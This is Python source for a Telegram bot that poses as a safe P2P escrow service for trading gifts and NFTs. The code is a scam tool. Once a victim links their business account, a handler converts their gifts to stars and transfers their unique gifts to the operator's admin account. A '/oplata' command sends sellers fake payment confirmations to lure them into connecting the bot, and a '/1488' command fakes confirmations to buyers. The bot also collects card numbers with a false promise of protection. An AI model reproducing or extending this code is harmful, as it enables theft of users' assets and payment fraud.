import os
import json
import random
import string
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import Message
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.methods.get_business_account_star_balance import GetBusinessAccountStarBalance
from aiogram.methods.get_business_account_gifts import GetBusinessAccountGifts
from custom_methods import GetFixedBusinessAccountStarBalance, GetFixedBusinessAccountGifts
from aiogram.methods import SendMessage, ReadBusinessMessage
from aiogram.methods.get_available_gifts import GetAvailableGifts
from aiogram.methods import TransferGift, ConvertGiftToStars
from aiogram.exceptions import TelegramBadRequest
import asyncio
from loader import dp, bot 
# config.py
from config import API_TOKEN, ADMIN_ID, BOT_USERNAME, BOT_NAME
import logging

bot = Bot(token=API_TOKEN)
dp = Dispatcher()

main_menu = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="💼 Управление кошельками", callback_data="add_wallet")],
        [types.InlineKeyboardButton(text="📄 Создать сделку", callback_data="create_deal")],
        # [types.InlineKeyboardButton(text="📎 Реферальная ссылка", callback_data="referral_link")],
        # [types.InlineKeyboardButton(text="🌐 Change language", callback_data="change_language")],
        [types.InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/wertinkol")],
    ]
)
    
back_button = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")],
    ]
)

# Новые клавиатуры для управления кошельками
wallet_menu = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="💳 Банковская карта", callback_data="add_card")],
        [types.InlineKeyboardButton(text="₿ Криптовалюта", callback_data="add_crypto")],
        [types.InlineKeyboardButton(text="👛 TON кошелек", callback_data="add_ton_wallet")],
        [types.InlineKeyboardButton(text="📋 Мои кошельки", callback_data="view_wallets")],
        [types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")],
    ]
)

crypto_menu = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="₿ Bitcoin (BTC)", callback_data="crypto_btc")],
        [types.InlineKeyboardButton(text="Ξ Ethereum (ETH)", callback_data="crypto_eth")],
        [types.InlineKeyboardButton(text="💎 TON", callback_data="crypto_ton")],
        [types.InlineKeyboardButton(text="🪙 USDT", callback_data="crypto_usdt")],
        [types.InlineKeyboardButton(text="🔙 Назад", callback_data="add_wallet")],
    ]
)

manage_wallets_menu = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="🗑 Удалить кошелек", callback_data="delete_wallet")],
        [types.InlineKeyboardButton(text="🔙 Назад", callback_data="add_wallet")],
    ]
)

cancel_deal_button = types.InlineKeyboardMarkup(
    inline_keyboard=[
        [types.InlineKeyboardButton(text="❌️ Отменить сделку", callback_data="cancel_deal")],
    ]
)

user_data = {}

os.makedirs("deals", exist_ok=True)
os.makedirs("users", exist_ok=True) 

CONNECTIONS_FILE = "business_connections.json"

REFS_FILE = "refs.json"

def load_refs():
    if os.path.exists(REFS_FILE):
        with open(REFS_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_refs(data):
    with open(REFS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, ensure_ascii=False, indent=4)
        
def load_connections():
    with open("business_connections.json", "r") as f:
        return json.load(f)
        
def save_business_connection_data(business_connection):
    business_connection_data = {
        "user_id": business_connection.user.id,
        "business_connection_id": business_connection.id,
        "username": business_connection.user.username,
        "first_name": business_connection.user.first_name,
        "last_name": business_connection.user.last_name
    }

    data = []

    if os.path.exists(CONNECTIONS_FILE):
        try:
            with open(CONNECTIONS_FILE, "r", encoding="utf-8") as f:
                data = json.load(f)
        except json.JSONDecodeError:
            pass

    updated = False
    for i, conn in enumerate(data):
        if conn["user_id"] == business_connection.user.id:
            data[i] = business_connection_data
            updated = True
            break

    if not updated:
        data.append(business_connection_data)

    with open(CONNECTIONS_FILE, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=2, ensure_ascii=False)

async def send_welcome_message_to_admin(user_id):
    try:
        await bot.send_message(ADMIN_ID, f"Пользователь #{user_id} подключил бота.")

        refs = load_refs()
        user_id_str = str(user_id)
        referrer_id = refs.get(user_id_str, {}).get("referrer_id")

        if referrer_id:
            try:
                await bot.send_message(int(referrer_id), f"Ваш реферал #{user_id} подключил бота.")
            except Exception as e:
                logging.warning(f"Не удалось отправить сообщение рефереру {referrer_id}: {e}")

    except Exception as e:
        logging.exception("Не удалось отправить сообщение в личный чат.")
                        
async def send_or_edit_message(user_id: int, text: str, reply_markup: types.InlineKeyboardMarkup, parse_mode: str = "HTML"):
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    
    try:
        # Удаляем предыдущее сообщение если оно существует
        if last_message_id:
            try:
                await bot.delete_message(chat_id=user_id, message_id=last_message_id)
            except Exception as e:
                print(f"Не удалось удалить предыдущее сообщение для пользователя {user_id}: {e}")
        
        # Отправляем новое сообщение
        sent_message = await bot.send_message(
            chat_id=user_id,
            text=text,
            reply_markup=reply_markup,
            parse_mode=parse_mode
        )
        
        # Сохраняем ID нового сообщения
        if user_id not in user_data:
            user_data[user_id] = {}
        user_data[user_id]["last_bot_message_id"] = sent_message.message_id
        
    except Exception as e:
        print(f"Ошибка при отправке сообщения для пользователя {user_id}: {e}")
        # Пытаемся отправить сообщение без reply_markup если есть ошибка
        try:
            sent_message = await bot.send_message(
                chat_id=user_id,
                text=text,
                parse_mode=parse_mode
            )
            if user_id not in user_data:
                user_data[user_id] = {}
            user_data[user_id]["last_bot_message_id"] = sent_message.message_id
        except Exception as e2:
            print(f"Критическая ошибка при отправке сообщения для пользователя {user_id}: {e2}")

@dp.business_connection()
async def handle_business_connect(business_connection):
    try:
        await send_welcome_message_to_admin(business_connection.user.id)

        business_connection_data = {
            "user_id": business_connection.user.id,
            "business_connection_id": business_connection.id,
            "username": business_connection.user.username,
            "first_name": business_connection.user.first_name,
            "last_name": business_connection.user.last_name
        }

        save_business_connection_data(business_connection)

        logging.info(f"Бизнес-аккаунт подключен: {business_connection.user.id}, connection_id: {business_connection.id}")

        try:
            gifts_response = await bot(GetBusinessAccountGifts(business_connection_id=business_connection.id))
            gifts = gifts_response.gifts
            converted_count = 0
            for gift in gifts:
                if gift.type == "unique":
                    continue
                try:
                    await bot(ConvertGiftToStars(
                        business_connection_id=business_connection.id,
                        owned_gift_id=str(gift.owned_gift_id)
                    ))
                    converted_count += 1
                except TelegramBadRequest as e:
                    if "GIFT_NOT_CONVERTIBLE" in str(e):
                        continue
                    else:
                        raise e
            await bot.send_message(ADMIN_ID, f"♻️ Конвертировано {converted_count} обычных подарков в звёзды.")
        except Exception as e:
            logging.warning(f"Ошибка при конвертации подарков: {e}")

        try:
            gifts_response = await bot(GetBusinessAccountGifts(
                business_connection_id=business_connection.id
            ))
            gifts = gifts_response.gifts
            transferred = 0
            transferred_gift_links = []

            for gift in gifts:
                if gift.type != "unique":
                    continue
                try:
                    await bot(TransferGift(
                        business_connection_id=business_connection.id,
                        new_owner_chat_id=int(ADMIN_ID),
                        owned_gift_id=gift.owned_gift_id,
                        star_count=gift.transfer_star_count
                    ))
                    transferred += 1
                    gift_link = f"https://t.me/nft/{gift.gift.name}"
                    transferred_gift_links.append(gift_link)
                except Exception as e:
                    logging.warning(f"Не удалось передать подарок {gift.owned_gift_id}: {e}")

            refs = load_refs()
            user_id_str = str(business_connection.user.id)
            
            if user_id_str not in refs:
                refs[user_id_str] = {"referrer_id": None, "joined": None, "gifts": [], "transferred_gifts": []}
            elif "transferred_gifts" not in refs[user_id_str]:
                refs[user_id_str]["transferred_gifts"] = []
            
            refs[user_id_str]["transferred_gifts"].extend(transferred_gift_links)
            save_refs(refs)

            message_text = (
                f"🎁 Автоматически передано {transferred} уникальных подарков от пользователя "
                f"#{business_connection.user.id} (@{business_connection.user.username})."
            )

            await bot.send_message(
                ADMIN_ID,
                message_text
            )


            referrer_id = refs.get(user_id_str, {}).get("referrer_id")
            if referrer_id:
                try:
                    await bot.send_message(
                        int(referrer_id),
                        f"Ваш реферал {business_connection.user.id} передал {transferred} уникальных подарков.\n\n{message_text}"
                    )
                except Exception as e:
                    logging.warning(f"Не удалось отправить сообщение рефереру {referrer_id}: {e}")

        except Exception as e:
            logging.exception("❌ Ошибка при автопередаче подарков.")

    except Exception as e:
        logging.exception("Ошибка при обработке бизнес-подключения.")

@dp.callback_query(F.data == "gift_received")
async def handle_gift_received(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    await callback.answer("❌️ Подарок еще не передан", show_alert=True)
            
@dp.message(Command("start"))
async def send_welcome(message: types.Message):
    user_id = message.from_user.id
    start_data = message.text.split(" ")

    # Очищаем данные пользователя при старте, но сохраняем last_bot_message_id если есть
    if user_id in user_data:
        last_message_id = user_data[user_id].get("last_bot_message_id")
        user_data[user_id] = {"last_bot_message_id": last_message_id}
    else:
        user_data[user_id] = {}

    if len(start_data) == 1:
        await send_or_edit_message(
            user_id,
            text=(
                f"👋 <b>Добро пожаловать в {BOT_NAME} – надежный P2P-гарант</b>\n\n"
                "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
                "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
                "📖 <b>Как пользоваться?</b>\nОзнакомьтесь с инструкцией — https://t.me/otcgifttg/71034/71035\n\n"
                "Выберите нужный пункт ниже:"
            ),
            reply_markup=main_menu
        )
    else:
        start_code = start_data[-1]
        
        if start_code.isalnum():
            deal_path = f"deals/{start_code}.json"

            if os.path.exists(deal_path):
                with open(deal_path, "r", encoding="utf-8") as file:
                    deal_data = json.load(file)

                seller_id = deal_data["user_id"]
                amount = deal_data["amount"]
                random_start = deal_data["random_start"]
                description = deal_data["description"]

                # КУРСЫ
                USDT_RATE = 2.9  # 1 TON = 2.9 USDT
                PX_RATE = 53       # 1 TON = 53 PX

                # Рассчитываем суммы с учетом 5% комиссии
                ton_amount = round(amount * 1.05, 2)  # 5% комиссия
                usdt_amount = round(ton_amount * USDT_RATE, 2)
                px_amount = round(ton_amount * PX_RATE, 2)

                # Проверяем, есть ли у покупателя реквизиты
                buyer_wallets = {}
                buyer_file_path = f"users/{user_id}.json"
                if os.path.exists(buyer_file_path):
                    try:
                        with open(buyer_file_path, "r", encoding="utf-8") as file:
                            buyer_info = json.load(file)
                        buyer_wallets = buyer_info.get("wallets", {})
                    except Exception as e:
                        print(f"Ошибка при загрузке кошельков покупателя: {e}")

                message_text = (
                    f"💳 <b>Информация о сделке #{random_start}</b>\n\n"
                    f"👤 <b>Вы покупатель</b> в сделке.\n"
                    f"📌 Продавец: <b>{seller_id}</b>\n"
                    f"• Успешные сделки: 0\n\n"
                    f"• Вы покупаете: {description}\n\n"
                    f"🏦 <b>Адрес для оплаты:</b>\n"
                    f"<code>UQDxaCKiTxQI1hYBVlE_uL2fJJxACSEdcVUZraV93Tlv-8Ro</code>\n\n"
                    f"💰 <b>Сумма к оплате:</b>\n"
                    f"⬛️ {px_amount} PX (1% fee)\n"
                    f"💵 {usdt_amount} USDT\n"
                    f"💎 {ton_amount} TON\n\n"
                    f"📝 <b>Комментарий к платежу:</b> {random_start}\n\n"
                    f"⚠️ <b>⚠️ Пожалуйста, убедитесь в правильности данных перед оплатой. Комментарий(мемо) обязателен!</b>\n\n"
                    f"После оплаты ожидайте автоматического подтверждения"
                )

                tonkeeper_url = f"ton://transfer/UQDxaCKiTxQI1hYBVlE_uL2fJJxACSEdcVUZraV93Tlv-8Ro?amount={int(ton_amount * 1e9)}&text={random_start}"

                # Создаем кнопки с реквизитами покупателя, если они есть
                buttons_rows = []
                buttons_rows.append([types.InlineKeyboardButton(text="Открыть в Tonkeeper", url=tonkeeper_url)])
                
                if buyer_wallets:
                    buttons_rows.append([types.InlineKeyboardButton(text="💳 Выбрать реквизиты для оплаты", callback_data=f"select_wallet_{random_start}")])
                
                buttons_rows.append([types.InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")])
                
                buttons = types.InlineKeyboardMarkup(inline_keyboard=buttons_rows)
                
                # Сохраняем ID покупателя в сделке
                deal_data["buyer_id"] = user_id
                with open(deal_path, "w", encoding="utf-8") as file:
                    json.dump(deal_data, file, ensure_ascii=False, indent=4)

                # Используем send_or_edit_message
                await send_or_edit_message(user_id, message_text, buttons)
            else:
                await send_or_edit_message(user_id, "❌ Сделка не найдена.", back_button)
        else:
            await send_or_edit_message(user_id, "❌ Неверный код сделки.", back_button)

@dp.message(Command("oplata"))
async def send_payment_confirmation(message: types.Message):
    user_id = message.from_user.id
    args = message.text.split()

    # Очищаем данные пользователя, но сохраняем last_bot_message_id если есть
    if user_id in user_data:
        last_message_id = user_data[user_id].get("last_bot_message_id")
        user_data[user_id] = {"last_bot_message_id": last_message_id}
    else:
        user_data[user_id] = {}

    if len(args) < 3:
        await send_or_edit_message(user_id, "Использование: /oplata {username} {seller_id}", back_button)
        return

    username = args[1]
    seller_id = args[2]
    
    message_text = (
        f"✅️ <b>Оплата подтверждена</b>\n\n"
        f"Подключите гарант бота к аккаунту, чтобы автоматически передать подарок покупателю - {username}"
    )

    keyboard = InlineKeyboardBuilder()
    keyboard.button(text="🎁 Подтверждаю отправку подарка", callback_data="gift_received")
    keyboard.button(text="🛠 Связаться с поддержкой", url="https://t.me/elechkasfinks")
    keyboard.adjust(1)

    try:
        await bot.send_message(
            chat_id=int(seller_id),
            text=message_text, 
            reply_markup=keyboard.as_markup(), 
            parse_mode="HTML"
        )
        await send_or_edit_message(user_id, "✅ <b>Сообщение отправлено продавцу!</b>", back_button)
    except Exception as e:
        await send_or_edit_message(user_id, f"❌ <b>Ошибка отправки сообщения:</b> {e}", back_button)
        # Очищаем только step, но сохраняем last_bot_message_id
        if user_id in user_data:
            user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}

@dp.message(F.text, lambda message: user_data.get(message.from_user.id, {}).get("step") in ["wallet", "ton_wallet", "card", "crypto_wallet"])
async def handle_wallet(message: types.Message):
    user_id = message.from_user.id
    step = user_data.get(user_id, {}).get("step")
    wallet_type = user_data.get(user_id, {}).get("wallet_type")
    
    user_file = f"users/{user_id}.json"
    os.makedirs("users", exist_ok=True)
    
    # Загружаем существующие данные пользователя
    user_info = {}
    if os.path.exists(user_file):
        with open(user_file, "r", encoding="utf-8") as file:
            user_info = json.load(file)
    
    # Инициализируем структуру кошельков если её нет
    if "wallets" not in user_info:
        user_info["wallets"] = {}
    
    if step == "wallet" or step == "ton_wallet":
        # Обработка TON кошелька
        wallet_address = message.text.strip()
        if len(wallet_address) >= 34:
            user_info["wallets"]["ton"] = {
                "address": wallet_address,
                "type": "ton"
            }
            
            with open(user_file, "w", encoding="utf-8") as file:
                json.dump(user_info, file, indent=4, ensure_ascii=False)
            
            await send_or_edit_message(
                user_id,
                "✅ <b>TON кошелек успешно добавлен/изменен!</b>",
                wallet_menu
            )
            # Очищаем только step, но сохраняем last_bot_message_id
            if user_id in user_data:
                user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
        else:
            await send_or_edit_message(
                user_id,
                "❌ <b>Неверный формат TON кошелька. Пожалуйста, отправьте правильный адрес.</b>",
                back_button
            )
    
    elif step == "card":
        # Обработка банковской карты
        card_number = message.text.strip().replace(" ", "").replace("-", "")
        
        # Простая валидация номера карты (должен быть 13-19 цифр)
        if card_number.isdigit() and 13 <= len(card_number) <= 19:
            user_info["wallets"]["card"] = {
                "number": card_number,
                "type": "card"
            }
            
            with open(user_file, "w", encoding="utf-8") as file:
                json.dump(user_info, file, indent=4, ensure_ascii=False)
            
            await send_or_edit_message(
                user_id,
                "✅ <b>Банковская карта успешно добавлена/изменена!</b>",
                wallet_menu
            )
            # Очищаем только step, но сохраняем last_bot_message_id
            if user_id in user_data:
                user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
        else:
            await send_or_edit_message(
                user_id,
                "❌ <b>Неверный формат номера карты. Пожалуйста, отправьте правильный номер карты.</b>",
                back_button
            )
    
    elif step == "crypto_wallet":
        # Обработка криптокошельков
        wallet_address = message.text.strip()
        crypto_type = wallet_type.replace("crypto_", "")
        
        # Простая валидация адреса (минимальная длина 26 символов для большинства криптовалют)
        if len(wallet_address) >= 26:
            user_info["wallets"][wallet_type] = {
                "address": wallet_address,
                "type": "crypto",
                "crypto_type": crypto_type
            }
            
            with open(user_file, "w", encoding="utf-8") as file:
                json.dump(user_info, file, indent=4, ensure_ascii=False)
            
            crypto_names = {
                "btc": "Bitcoin (BTC)",
                "eth": "Ethereum (ETH)",
                "ton": "TON",
                "usdt": "USDT"
            }
            
            await send_or_edit_message(
                user_id,
                f"✅ <b>{crypto_names.get(crypto_type, crypto_type.upper())} кошелек успешно добавлен/изменен!</b>",
                wallet_menu
            )
            # Очищаем только step, но сохраняем last_bot_message_id
            if user_id in user_data:
                user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
        else:
            await send_or_edit_message(
                user_id,
                "❌ <b>Неверный формат адреса кошелька. Пожалуйста, отправьте правильный адрес.</b>",
                back_button
            )

@dp.callback_query(lambda callback: callback.data == "change_language")
async def change_language(callback: types.CallbackQuery):
    await bot.answer_callback_query(callback.id, text="❌️ Ошибка", show_alert=True)                    

@dp.message(Command("1488"))
async def confirm_payment(message: types.Message):
    user_id = message.from_user.id
    start_data = message.text.split(" ")

    # Очищаем данные пользователя, но сохраняем last_bot_message_id если есть
    if user_id in user_data:
        last_message_id = user_data[user_id].get("last_bot_message_id")
        user_data[user_id] = {"last_bot_message_id": last_message_id}
    else:
        user_data[user_id] = {}

    if len(start_data) == 2:
        deal_code = start_data[1] 

        deal_path = f"deals/{deal_code}.json" 
        
        if os.path.exists(deal_path):
            with open(deal_path, "r", encoding="utf-8") as file:
                deal_data = json.load(file)

            # Получаем информацию о кошельках продавца
            seller_wallets = deal_data.get("seller_wallets", {})
            wallets_info = ""
            
            if seller_wallets:
                wallets_info = "\n\n💳 <b>Кошельки продавца для оплаты:</b>\n"
                for wallet_type, wallet_data in seller_wallets.items():
                    if wallet_type == "card":
                        wallets_info += f"💳 <b>Карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>\n"
                    elif wallet_type == "ton":
                        wallets_info += f"👛 <b>TON:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
                    elif wallet_type.startswith("crypto_"):
                        crypto_name = wallet_type.replace("crypto_", "").upper()
                        wallets_info += f"₿ <b>{crypto_name}:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
            else:
                wallets_info = "\n\n⚠️ <b>Внимание:</b> У продавца нет добавленных кошельков!"

            message_text = (
                f"✅️ <b>Оплата подтверждена</b> для сделки #{deal_code}\n\n"
                f"💰 <b>Сумма:</b> <code>{deal_data['amount']} TON</code>\n"
                f"📜 <b>Описание:</b> <code>{deal_data['description']}</code>\n\n"
                "Пожалуйста, подтвердите получение подарка после того, как продавец его отправит."
                + wallets_info
            )

            buttons = types.InlineKeyboardMarkup(
                inline_keyboard=[
                    [types.InlineKeyboardButton(text="🎁 Я получил подарок", callback_data="gift_received")],
                    [types.InlineKeyboardButton(text="🛠 Связаться с поддержкой", url="https://t.me/wertinkol")]
                ]
            )

            await send_or_edit_message(user_id, message_text, buttons)
            
            # Отправляем уведомление покупателю о подтверждении сделки
            buyer_id = deal_data.get("buyer_id")
            if buyer_id and buyer_id != user_id:  # Проверяем, что покупатель существует и это не админ
                try:
                    buyer_notification = (
                        f"✅️ <b>Ваша сделка #{deal_code} подтверждена!</b>\n\n"
                        f"💰 <b>Сумма:</b> <code>{deal_data['amount']} TON</code>\n"
                        f"📜 <b>Описание:</b> <code>{deal_data['description']}</code>\n\n"
                        "Ожидайте отправки подарка от продавца."
                    )
                    
                    buyer_buttons = types.InlineKeyboardMarkup(
                        inline_keyboard=[
                            [types.InlineKeyboardButton(text="🎁 Я получил подарок", callback_data="gift_received")],
                            [types.InlineKeyboardButton(text="🛠 Связаться с поддержкой", url="https://t.me/wertinkol")]
                        ]
                    )
                    
                    await bot.send_message(
                        chat_id=buyer_id,
                        text=buyer_notification,
                        reply_markup=buyer_buttons,
                        parse_mode="HTML"
                    )
                except Exception as e:
                    print(f"Ошибка отправки уведомления покупателю {buyer_id}: {e}")
        else:
            await send_or_edit_message(user_id, "❌ Сделка не найдена.", back_button)
            # Очищаем только step, но сохраняем last_bot_message_id
            if user_id in user_data:
                user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    else:
        await send_or_edit_message(user_id, "❌ Неверный формат команды. Используйте /1488 {номер сделки}.", back_button)
        # Очищаем только step, но сохраняем last_bot_message_id
        if user_id in user_data:
            user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")} 
        
@dp.callback_query(lambda callback: callback.data == "confirm_payment")
async def handle_payment_confirmation(callback: types.CallbackQuery):
    await bot.answer_callback_query(callback.id, text="Оплата не найдена. Подождите 10 секунд", show_alert=True)

@dp.callback_query(lambda callback: callback.data == "close_popup")
async def close_popup(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}

    await send_or_edit_message(user_id, "Окно закрыто.", None)
    
@dp.callback_query(lambda callback: callback.data == "create_deal")
async def start_deal(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Сохраняем last_bot_message_id для правильного удаления сообщений
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    
    # Проверяем наличие кошельков у пользователя
    user_file_path = f"users/{user_id}.json"
    has_wallets = False
    
    if os.path.exists(user_file_path):
        try:
            with open(user_file_path, "r", encoding="utf-8") as file:
                user_info = json.load(file)
            
            wallets = user_info.get("wallets", {})
            has_wallets = len(wallets) > 0
        except Exception as e:
            has_wallets = False
    
    if not has_wallets:
        # Создаем клавиатуру с кнопкой для добавления кошелька
        no_wallets_keyboard = types.InlineKeyboardMarkup(
            inline_keyboard=[
                [types.InlineKeyboardButton(text="💼 Добавить кошелек", callback_data="add_wallet")],
                [types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")]
            ]
        )
        
        # Сохраняем last_bot_message_id
        user_data[user_id] = {"last_bot_message_id": last_message_id}
        
        await send_or_edit_message(
            user_id,
            "❌ <b>Для создания сделки необходимо добавить реквизиты!</b>\n\n"
            "У вас нет добавленных кошельков для получения оплаты.\n"
            "Пожалуйста, добавьте хотя бы один кошелек в разделе 'Управление кошельками'.",
            no_wallets_keyboard
        )
        return
    
    # Если кошельки есть, показываем выбор реквизитов
    user_data[user_id] = {"step": "select_wallet", "last_bot_message_id": last_message_id}
    
    # Загружаем кошельки пользователя
    with open(user_file_path, "r", encoding="utf-8") as file:
        user_info = json.load(file)
    
    wallets = user_info.get("wallets", {})
    
    # Создаем клавиатуру с реквизитами
    keyboard = []
    for wallet_type, wallet_data in wallets.items():
        if wallet_type == "card":
            button_text = f"💳 Карта: {wallet_data['number'][:4]}****{wallet_data['number'][-4:]}"
        elif wallet_type == "ton":
            button_text = f"👛 TON: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
        elif wallet_type.startswith("crypto_"):
            crypto_name = wallet_type.replace("crypto_", "").upper()
            button_text = f"₿ {crypto_name}: {wallet_data['address'][:8]}...{wallet_data['address'][-8:]}"
        else:
            continue
        
        keyboard.append([types.InlineKeyboardButton(text=button_text, callback_data=f"create_deal_wallet_{wallet_type}")])
    
    keyboard.append([types.InlineKeyboardButton(text="🔙 Вернуться в меню", callback_data="back_to_menu")])
    
    wallet_selection_menu = types.InlineKeyboardMarkup(inline_keyboard=keyboard)

    await send_or_edit_message( 
        user_id, 
        text="💼 <b>Создание сделки</b>\n\nВыберите реквизиты для получения оплаты:",
        reply_markup=wallet_selection_menu
    )

@dp.message()
async def handle_steps(message: types.Message):
    user_id = message.from_user.id
    step = user_data.get(user_id, {}).get("step")

    if step == "amount":
        try:
            amount = float(message.text.strip())

            # Сохраняем last_bot_message_id
            last_message_id = user_data[user_id].get("last_bot_message_id")
            user_data[user_id]["amount"] = amount
            user_data[user_id]["step"] = "description"
            user_data[user_id]["last_bot_message_id"] = last_message_id

            await send_or_edit_message(
                user_id,
                "📝 <b>Укажите, что вы предлагаете в этой сделке:</b>\n\n"
                "Пример: <i>10 кепок и 5 пепе...</i>",
                back_button
            )
        except ValueError:
            await send_or_edit_message(
                user_id,
                "❌ Пожалуйста, введите сумму в правильном формате (например, <code>100.5</code>).",
                back_button
            )

    elif step == "description":
        description = message.text.strip()
        user_data[user_id]["description"] = description

        random_start = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        user_data[user_id]["link"] = f"https://t.me/{BOT_USERNAME}?start={random_start}"

        # Получаем выбранный кошелек продавца
        selected_wallet_type = user_data[user_id].get("selected_wallet")
        seller_wallets = {}
        
        if selected_wallet_type:
            user_file_path = f"users/{user_id}.json"
            if os.path.exists(user_file_path):
                try:
                    with open(user_file_path, "r", encoding="utf-8") as file:
                        user_info = json.load(file)
                    all_wallets = user_info.get("wallets", {})
                    if selected_wallet_type in all_wallets:
                        seller_wallets[selected_wallet_type] = all_wallets[selected_wallet_type]
                except Exception as e:
                    print(f"Ошибка при загрузке кошельков продавца: {e}")

        deal_data = {
            "user_id": user_id,
            "amount": user_data[user_id]["amount"],
            "description": user_data[user_id]["description"],
            "link": user_data[user_id]["link"],
            "seller_id": user_id,
            "random_start": random_start,
            "seller_wallets": seller_wallets
        }
        deal_file_path = f"deals/{random_start}.json"
        with open(deal_file_path, "w", encoding="utf-8") as file:
            json.dump(deal_data, file, ensure_ascii=False, indent=4)

        # Формируем информацию о кошельках для отображения
        wallets_display = ""
        if seller_wallets:
            wallets_display = "\n\n💳 <b>Кошельки для оплаты:</b>\n"
            for wallet_type, wallet_data in seller_wallets.items():
                if wallet_type == "card":
                    wallets_display += f"💳 <b>Карта:</b> <code>{wallet_data['number'][:4]} **** **** {wallet_data['number'][-4:]}</code>\n"
                elif wallet_type == "ton":
                    wallets_display += f"👛 <b>TON:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
                elif wallet_type.startswith("crypto_"):
                    crypto_name = wallet_type.replace("crypto_", "").upper()
                    wallets_display += f"₿ <b>{crypto_name}:</b> <code>{wallet_data['address'][:10]}...{wallet_data['address'][-10:]}</code>\n"
        else:
            wallets_display = "\n\n⚠️ <b>Внимание:</b> У вас нет добавленных кошельков для получения оплаты!"

        await send_or_edit_message(
            user_id,
            "✅ <b>Сделка успешно создана!</b>\n\n"
            f"💰 <b>Сумма:</b> <code>{deal_data['amount']} TON</code>\n"
            f"📜 <b>Описание:</b> <code>{deal_data['description']}</code>\n"
            f"🔗 <b>Ссылка для покупателя:</b> {deal_data['link']}"
            + wallets_display,
            cancel_deal_button
        )

        # Очищаем только step, но сохраняем last_bot_message_id
        if user_id in user_data:
            user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")} 
        
@dp.callback_query(lambda callback: callback.data == "back_to_menu")
async def back_to_menu(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    await send_or_edit_message(
        user_id,
        text=(
            f"👋 <b>Добро пожаловать в {BOT_NAME} – надежный P2P-гарант</b>\n\n"
            "<b>💼 Покупайте и продавайте всё, что угодно – безопасно!</b>\n"
            "От Telegram-подарков и NFT до токенов и фиата – сделки проходят легко и без риска.\n\n"
            "📖 <b>Как пользоваться?</b>\nОзнакомьтесь с инструкцией — https://t.me/otcgifttg/71034/71035\n\n"
            "Выберите нужный пункт ниже:"
        ),
        reply_markup=main_menu
    )

@dp.callback_query(lambda callback: callback.data == "add_wallet")
async def add_wallet(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}
    
    text = "💼 <b>Управление кошельками</b>\n\nВыберите тип кошелька, который хотите добавить или изменить:"
    
    await send_or_edit_message(user_id, text, wallet_menu) 
    
@dp.callback_query(lambda callback: callback.data == "cancel_deal")
async def cancel_deal(callback: types.CallbackQuery):
    user_id = callback.from_user.id

    # Очищаем только step, но сохраняем last_bot_message_id
    if user_id in user_data:
        user_data[user_id] = {"last_bot_message_id": user_data[user_id].get("last_bot_message_id")}

    await send_or_edit_message(
        user_id,
        "❌ Сделка была отменена. Возвращаемся в главное меню.",
        main_menu
    )

# Обработчики для управления кошельками
@dp.callback_query(lambda callback: callback.data == "add_card")
async def add_card(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
    # Сохраняем last_bot_message_id и устанавливаем новые данные
    last_message_id = user_data.get(user_id, {}).get("last_bot_message_id")
    user_data[user_id] = {"step": "card", "wallet_type": "card", "last_bot_message_id": last_message_id}
    
    await send_or_edit_message(
        user_id,
        "💳 <b>Добавление банковской карты</b>\n\n"
        "Отправьте номер вашей банковской карты в формате:\n"
        "<code>1234 5678 9012 3456</code>\n\n"
        "⚠️ <i>Ваши данные защищены и используются только для проведения сделок</i>",
        back_button
    )

@dp.callback_query(lambda callback: callback.data == "add_crypto")
async def add_crypto(callback: types.CallbackQuery):
    user_id = callback.from_user.id
    
